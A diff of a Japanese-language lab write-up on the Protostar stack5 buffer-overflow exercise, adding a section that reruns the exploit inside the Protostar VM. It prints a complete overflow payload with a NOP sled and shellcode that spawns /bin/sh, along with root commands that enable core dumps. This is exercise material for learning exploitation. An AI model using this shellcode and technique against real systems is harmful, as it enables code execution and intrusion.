@@ -214,8 +214,7 @@ gef➤  quit
 ```
 
 `0xffffd3b0`に`$eip`を設定(書き換え)して、そこにshellcodeを仕込む
-`0xffffd3b0` &rarr; `\xb0\xd3\xff\xff`
-shellcode &rarr; *\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80*
+`0xffffd3b0` はlittle-endianで `\xb0\xd3\xff\xff`
 
 ```shell
 % ./stack5 <<< $(python -c 'print "A"*76 + "\xb0\xd3\xff\xff" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
@@ -224,3 +223,28 @@ core	final1	format0  format2  format4  heap1  heap3  net1  net3  stack0  stack2 
 final0	final2	format1  format3  heap0    heap2  net0	 net2  net4  stack1  stack3  stack5  stack7
 ```
 
+# VMでやってみる
+もともとはProtostarのものなので、そっちでもやってみる
+とはいってもあまり変わらない(やるだけ)
+
+```shell
+$ mktemp -d
+/tmp/tmp.tQ4Q1WRO1K
+$ cd /tmp/tmp.tQ4Q1WRO1K
+$ su
+Password: godmode
+# sysctl -w kernel.core_pattern=core.%s.%e.%p
+kernel.core_pattern = core.%s.%e.%p
+# sysctl -w fs.suid_dumpable=2
+fs.suid_dumpable = 2
+# exit
+$ /opt/protostar/bin/stack5 <<< $(python -c 'print "A"*76 + "\xe0\xd0\xff\xbf" + "\x90"*2048 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
+Segmentation fault (core dumped)
+$ ls
+core.11.stack5.2416
+$ su
+Password: godmode
+# chmod -v 0666 ./core.11.stack5.2416
+mode of `core.11.stack5.2416' changed to 0666 (rw-rw-rw-)
+root@protostar:/tmp/tmp.tQ4Q1WRO1K# exit
+```
